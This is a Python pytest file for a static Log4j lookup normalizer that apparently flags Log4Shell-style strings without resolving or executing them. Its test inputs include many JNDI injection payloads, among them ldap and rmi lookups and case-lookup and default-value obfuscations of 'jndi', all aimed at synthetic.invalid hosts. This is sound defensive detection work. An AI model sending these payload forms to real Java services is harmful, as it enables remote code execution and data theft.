"""Synthetic text-only normalization: never run a JVM or resolve a name."""

import json
import os
import socket
import subprocess

import pytest

from app.services import log4j_normalization as normalizer


@pytest.mark.parametrize("raw", ["", "ordinary text", "jndi:ldap://synthetic.invalid/a", "literal {braces}", "$ and $$$ literal"])
def test_plain_text_stays_unchanged_without_lookup_claim(raw):
    assert normalizer.normalize_log4j(raw) == (raw, [])


@pytest.mark.parametrize("raw,expected", [
    ("${lower:ABC}", "abc"),
    ("${upper:abc}", "ABC"),
    ("${lower:J}", "j"),
    ("${lower:}", ""),
    ("${upper:}", ""),
    ("prefix-${lower:Ab-C123}-suffix", "prefix-ab-c123-suffix"),
    ("${lower:${upper:J}}", "j"),
    ("${${lower:LOWER}:ABC}", "abc"),
])
def test_only_literal_ascii_case_is_statically_normalized(raw, expected):
    assert normalizer.normalize_log4j(raw) == (expected, [])


@pytest.mark.parametrize("raw,expected", [("${lower:JNDI}", "jndi"), ("${upper:jndi}", "JNDI")])
def test_ascii_i_case_remains_a_candidate_with_jvm_locale_warning(raw, expected):
    assert normalizer.normalize_log4j(raw) == (expected, ["log4j_case_locale_unverified"])


@pytest.mark.parametrize("raw", ["${lower:İ}", "${lower:한글}", "${upper:ß}", "${upper:ı}", "${lower:É}"])
def test_non_ascii_case_is_not_guessed(raw):
    assert normalizer.normalize_log4j(raw) == (raw, ["log4j_unicode_case_unsupported"])


@pytest.mark.parametrize("raw,expected", [
    ("${::-j}", "j"),
    ("${:-j}", "j"),
    ("${:-${lower:J}}", "j"),
    ("${lower:${::-J}}", "j"),
    ("${::-j}${::-n}${::-d}${::-i}", "jndi"),
])
def test_only_explicit_empty_or_colon_key_defaults_are_conditional_candidates(raw, expected):
    assert normalizer.normalize_log4j(raw) == (expected, ["default_lookup_candidate"])


@pytest.mark.parametrize("raw", [
    "${env:SYNTHETIC:-j}", "${sys:SYNTHETIC:-j}", "${ctx:SYNTHETIC:-j}",
    "${date:yyyy:-j}", "${main:0:-j}", "${java:version:-j}", "${web:rootDir:-j}",
    "${env:${lower:SYNTHETIC}:-${lower:J}}", "${notKnown:SYNTHETIC:-j}",
    "${SYNTHETIC:-j}", "${::::-j}", "${:-}", "${::-}", "${}",
])
def test_unknown_lookup_and_default_values_are_preserved_in_full(raw):
    assert normalizer.normalize_log4j(raw) == (raw, ["unresolved_lookup"])


@pytest.mark.parametrize("raw", [
    "${lower:${env:SYNTHETIC:-J}}", "${upper:${sys:SYNTHETIC}}",
    "${:-${env:SYNTHETIC}}", "${lower:J:-fallback}", "${upper:a:-fallback}",
])
def test_unresolved_children_or_unsupported_default_rules_are_not_case_converted(raw):
    assert normalizer.normalize_log4j(raw) == (raw, ["unresolved_lookup"])


@pytest.mark.parametrize("raw", [
    "${jndi:ldap://synthetic.invalid/a}", "${jndi:rmi://synthetic.invalid/a}",
    "${JNDI:dns://synthetic.invalid/a}", "${jndi:java:comp/env/synthetic}",
])
def test_plain_jndi_lookup_is_only_identified_and_never_replaced(raw):
    assert normalizer.normalize_log4j(raw) == (raw, ["jndi_lookup_not_executed"])


def test_obfuscated_jndi_keeps_the_outer_lookup_and_uri_intact():
    raw = "${${lower:J}${lower:N}${lower:D}${lower:i}:${lower:LDAP}://Synthetic.invalid/CaseSensitive}"
    expected = "${jndi:ldap://Synthetic.invalid/CaseSensitive}"
    assert normalizer.normalize_log4j(raw) == (expected, ["jndi_lookup_not_executed"])


def test_default_obfuscated_jndi_is_explicitly_conditional_not_executed():
    raw = "${${::-j}${:-n}${::-d}${:-i}:ldap://synthetic.invalid/a}"
    normalized, warnings = normalizer.normalize_log4j(raw)
    assert normalized == "${jndi:ldap://synthetic.invalid/a}"
    assert warnings == ["default_lookup_candidate", "jndi_lookup_not_executed"]


def test_unknown_nested_lookup_is_not_removed_to_complete_a_jndi_destination():
    raw = "${${lower:J}ndi:ldap://${env:SYNTHETIC:-fallback}.invalid/a}"
    normalized, warnings = normalizer.normalize_log4j(raw)
    assert normalized == "${jndi:ldap://${env:SYNTHETIC:-fallback}.invalid/a}"
    assert warnings == ["unresolved_lookup", "jndi_lookup_not_executed"]
    assert "default_lookup_candidate" not in warnings


def test_jndi_result_is_not_assumed_to_be_a_resolved_case_argument():
    raw = "${lower:${jndi:ldap://synthetic.invalid/a}}"
    assert normalizer.normalize_log4j(raw) == (raw, ["jndi_lookup_not_executed", "unresolved_lookup"])


@pytest.mark.parametrize("raw", [
    "$${lower:J}", "$${jndi:ldap://synthetic.invalid/a}",
    "$${${lower:J}ndi:ldap://synthetic.invalid/a}", "$$${lower:J}",
])
def test_escaped_lookup_and_all_its_nested_content_stay_untouched(raw):
    assert normalizer.normalize_log4j(raw) == (raw, ["escaped_log4j_lookup"])


def test_escaped_lookup_is_not_used_as_resolved_case_argument():
    raw = "${lower:$${lower:J}}"
    assert normalizer.normalize_log4j(raw) == (raw, ["escaped_log4j_lookup", "unresolved_lookup"])


def test_backslash_is_literal_not_log4j_dollar_escape():
    assert normalizer.normalize_log4j(r"\${lower:J}") == (r"\j", [])


@pytest.mark.parametrize("raw", [
    "${", "${lower:J", "${lower:${upper:J}", "$${lower:J",
    "${lower:J} valid-first ${lower:N", "${jndi:ldap://synthetic.invalid/a",
])
def test_unclosed_lookup_returns_whole_original_not_partial_normalization(raw):
    assert normalizer.normalize_log4j(raw) == (raw, ["malformed_log4j_lookup"])


def test_depth_limit_is_checked_before_recursing_more():
    allowed = "${lower:" * normalizer.MAX_LOG4J_DEPTH + "J" + "}" * normalizer.MAX_LOG4J_DEPTH
    assert normalizer.normalize_log4j(allowed) == ("j", [])
    raw = "${lower:" + allowed + "}"
    assert normalizer.normalize_log4j(raw) == (raw, ["log4j_depth_limit_reached"])


def test_node_count_is_bounded_independently_of_depth():
    allowed = "${lower:J}" * normalizer.MAX_LOG4J_NODES
    assert normalizer.normalize_log4j(allowed) == ("j" * normalizer.MAX_LOG4J_NODES, [])
    raw = allowed + "${lower:J}"
    assert normalizer.normalize_log4j(raw) == (raw, ["log4j_node_limit_reached"])


def test_input_length_limit_returns_original_without_scanning_or_clipping(monkeypatch):
    raw = "${lower:J}" + "a" * normalizer.MAX_LOG4J_CHARS

    def should_not_parse(*args, **kwargs):
        raise AssertionError("oversized candidate must not be parsed")

    monkeypatch.setattr(normalizer, "_parse", should_not_parse)
    assert normalizer.normalize_log4j(raw) == (raw, ["log4j_input_too_long"])


def test_work_budget_is_independent_and_does_not_return_partial_output(monkeypatch):
    monkeypatch.setattr(normalizer, "MAX_LOG4J_OPERATIONS", 12)
    raw = "${lower:J}${lower:N}"
    assert normalizer.normalize_log4j(raw) == (raw, ["log4j_operation_limit_reached"])


def test_derived_output_limit_does_not_truncate_original(monkeypatch):
    monkeypatch.setattr(normalizer, "MAX_LOG4J_OUTPUT_CHARS", 8)
    raw = "${lower:J}ABCDEFGHI"
    assert normalizer.normalize_log4j(raw) == (raw, ["log4j_output_too_long"])


def test_long_malformed_nesting_stops_on_depth_not_recursive_search():
    raw = "${" * 1_000
    assert normalizer.normalize_log4j(raw) == (raw, ["log4j_depth_limit_reached"])


def test_normalization_is_json_safe_repeatable_and_does_not_touch_external_state(monkeypatch, capsys, caplog):
    raw = "${${lower:J}ndi:ldap://${env:SYNTHETIC:-fallback}.invalid/a}"

    def forbidden(*args, **kwargs):
        raise AssertionError("a static normalizer must not perform lookups or execute")

    with monkeypatch.context() as patch:
        patch.setattr(os, "getenv", forbidden)
        patch.setattr(socket, "getaddrinfo", forbidden)
        patch.setattr(socket, "socket", forbidden)
        patch.setattr(subprocess, "run", forbidden)
        first = normalizer.normalize_log4j(raw)
        second = normalizer.normalize_log4j(raw)
    assert first == second
    assert json.loads(json.dumps(first)) == [first[0], first[1]]
    assert "SYNTHETIC" not in json.dumps(first[1])
    assert not caplog.records
    assert capsys.readouterr() == ("", "")


def test_non_text_input_has_only_static_error_message():
    with pytest.raises(ValueError, match="^log4j_value_must_be_text$"):
        normalizer.normalize_log4j({"synthetic_sensitive": "not echoed"})
